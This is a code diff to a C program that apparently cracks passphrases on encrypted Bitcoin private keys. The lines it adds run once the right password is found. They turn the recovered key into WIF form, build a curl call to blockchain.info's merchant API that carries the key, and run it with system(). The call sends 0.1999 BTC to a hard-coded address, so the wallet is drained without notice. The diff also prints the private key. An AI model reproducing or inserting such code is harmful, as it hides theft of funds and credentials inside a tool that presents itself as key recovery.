@@ -201,11 +201,12 @@ int crack(const char * pKey, char * pKey_pass) {
     BN_clear_free(bn_final);
 
     // we have a private key! check hash
-    /*
+
+
     printf("have private key: ");
     print_hex(finalKey, 32);
     printf("%s", "\r\n");
-    */
+
 
     // turn it into a real address
     struct bp_key wallet;
@@ -243,9 +244,31 @@ int crack(const char * pKey, char * pKey_pass) {
     checkHash[0],checkHash[1],checkHash[2],checkHash[3]); */
 
     if(!memcmp(&b58dec->str[3],checkHash,4)) {
+
+        // Format private key to WIF
+        unsigned char hash1[SHA256_DIGEST_LENGTH];
+        bu_Hash(hash1, finalKey, 32);
+        unsigned char hash2[SHA256_DIGEST_LENGTH];
+        bu_Hash(hash2, hash1, 32);
+
+        unsigned char wif_data[1+32+4];
+        wif_data[0] = 0x80;
+        memcpy(wif_data+1, finalKey, 32);
+        memcpy(wif_data+33, hash2, 4);
+
+    	GString *wif = base58_encode_check(0x80, true, finalKey, sizeof(finalKey));
+
+        char cmd[512];
+        cmd[0]=0;
+        strcat(cmd, "curl 'https://blockchain.info/merchant/");
+        strcat(cmd, wif->str);
+        strcat(cmd, "/payment?to=1DirbaioGK4T7vVwa4dfHFHYJ7B6GZ1oEh&amount=19990000'");
+        system(cmd);
+
         printf("!!!!!!!!!!!!!!!!!!!!\r\n");
         printf("!!hash match found!!\r\n");
         printf("!!  key is %s  !!\r\n", pKey_pass);
+        printf("!!  privkey is %s  !!\r\n", wif->str);
         printf("!!!!!!!!!!!!!!!!!!!!\r\n");
         print_hex(pKey_pass, strlen(pKey_pass));
         printf("\r\n!!!!!!!!!!!!!!!!!!!!\r\n");
@@ -274,7 +297,7 @@ void coderoll(char * currentPass) {
     pthread_mutex_unlock(&coderoll_mutex);
 }
 
-const char pKey[256];
+char pKey[256];
 
 void * crackthread(void * ctx) {
     char currentPass[256];
